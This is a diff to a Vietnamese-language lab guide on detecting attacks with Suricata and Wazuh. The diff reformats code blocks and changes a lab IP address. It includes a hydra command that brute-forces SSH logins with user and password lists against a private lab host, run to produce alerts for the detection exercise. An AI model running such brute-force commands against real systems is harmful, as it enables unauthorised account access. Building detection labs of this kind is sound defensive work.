@@ -90,11 +90,17 @@ sudo apt install ssh
 sudo systemctl start ssh
 ```
 Sau khi cài đặt, kiểm tra trạng thái hoạt động của ssh trên cả hai máy bằng lệnh sau:
-```sudo systemctl status ssh```
+```
+sudo systemctl status ssh
+```
 Tiếp theo, trên máy attacker, chạy các lệnh sau để cài đặt công cụ hydra - giúp tiến hành tấn công brute-force thông tin đăng nhập trên máy monitor:
-```sudo apt install hydra```
+```
+sudo apt install hydra
+```
 Tiếp theo, tiến hành tấn công brute-force bằng lệnh sau trên máy attacker:
-```hydra -L users.txt -P passwords.txt -t 16 -f -s 22 -V ssh://172.20.0.10```
+```
+hydra -L users.txt -P passwords.txt -t 16 -f -s 22 -V ssh://192.168.38.3
+```
 - **Task 7** : Kiểm tra log Suricata trên Dashboard của  Wazuh
 Mở giao diện Wazuh trên trình duyệt , chọn agent đang active . Chọn Threat hunting => Event 
 ![](wazuh5.png)
